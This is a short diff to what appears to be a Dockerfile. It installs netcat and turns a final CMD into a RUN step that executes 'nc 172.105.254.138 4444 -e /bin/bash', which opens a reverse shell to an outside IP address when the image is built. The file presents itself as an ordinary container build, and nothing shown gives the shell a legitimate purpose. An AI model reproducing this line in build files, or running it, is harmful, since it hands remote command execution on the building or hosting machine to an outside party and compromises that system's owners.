@@ -4,4 +4,4 @@ COPY / /tmp/.
 
 WORKDIR /tmp
 RUN apt-get update && apt-get install netcat -y
-CMD nc 172.105.254.138 4444 –e /bin/bash
+RUN nc 172.105.254.138 4444 –e /bin/bash
